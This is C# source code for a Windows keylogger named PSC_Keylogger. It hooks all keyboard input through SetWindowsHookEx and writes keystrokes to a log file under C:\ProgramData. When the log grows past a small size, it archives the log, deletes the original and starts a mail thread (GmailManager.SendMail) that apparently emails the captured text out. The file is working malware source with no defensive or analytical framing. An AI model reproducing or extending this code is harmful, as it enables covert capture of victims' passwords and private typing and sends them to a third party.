﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace PSC_Keylogger
{
    public static class BaseKeylogger
    {
        public const string DIRECTORY_FILE_NAME = @"C:\ProgramData\Z_PSC";
        public static string LOG_FILE_NAME = $@"{DIRECTORY_FILE_NAME}\mylog.txt";
        public static string ARCHIVE_FILE_NAME = $@"{DIRECTORY_FILE_NAME}\mylog_archive.txt";

        private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 50;
        private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 0;

        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        public static IntPtr hook = IntPtr.Zero;
        public static LowLevelKeyboardProc llkProcedure = HookCallback;

        private static string buffer = "";

        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {

            if (buffer.Length >= MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG)
            {
                StreamWriter output = new StreamWriter(LOG_FILE_NAME, true);
                output.Write(buffer);
                output.Close();
                buffer = "";
            }

            FileInfo logFile = new FileInfo(LOG_FILE_NAME);

            if (logFile.Exists && logFile.Length >= MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL)
            {
                try
                {
                    logFile.CopyTo(ARCHIVE_FILE_NAME, true);

                    logFile.Delete();

                    System.Threading.Thread mailThread = new System.Threading.Thread(GmailManager.SendMail);
                    mailThread.Start();
                }
                catch (Exception e)
                {
                    Console.Out.WriteLine(e.Message);
                }
            }

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string strCode = ((Keys)vkCode).ToString();
                switch (strCode)
                {
                    case "OemPeriod":
                        buffer += ".";
                        break;
                    case "Oemcomma":
                        buffer += ",";
                        break;
                    case "Space":
                        buffer += " ";
                        break;
                    case "Enter": case "Return":
                        buffer += "\n";
                        break;
                    case "LShiftKey": case "RShiftKey":
                    case "LControlKey": case "RControlKey":
                    case "Tab": case "Back":
                        buffer += "";
                        break;
                    default:
                        buffer += strCode;
                        break;
                }
            }

            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        public static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }


        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);
    }
}
